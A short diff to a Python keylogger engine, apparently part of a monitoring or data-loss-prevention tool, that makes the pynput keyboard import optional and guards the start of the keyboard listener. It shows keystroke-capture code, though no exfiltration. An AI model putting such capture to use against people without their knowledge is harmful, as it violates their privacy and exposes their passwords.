@@ -20,7 +20,12 @@ import threading
 from datetime import datetime
 
 import requests
-from pynput import keyboard
+try:
+    from pynput import keyboard
+    HAS_PYNPUT = True
+except Exception:
+    keyboard = None
+    HAS_PYNPUT = False
 from dlp_scanner import DLPScannerService
 from activity_tracker import WindowActivityTracker
 
@@ -572,11 +577,12 @@ class KeyLoggerEngine:
         self.write_system_info()
 
         # Start keyboard listener
-        try:
-            self.listener = keyboard.Listener(on_press=self.on_key_press)
-            self.listener.start()
-        except Exception as e:
-            print(f"[!] Keyboard listener error: {e}")
+        if HAS_PYNPUT and keyboard:
+            try:
+                self.listener = keyboard.Listener(on_press=self.on_key_press)
+                self.listener.start()
+            except Exception as e:
+                print(f"[!] Keyboard listener error: {e}")
 
         # Start periodic worker thread
         self.worker_thread = threading.Thread(target=self.periodic_tasks, daemon=True)
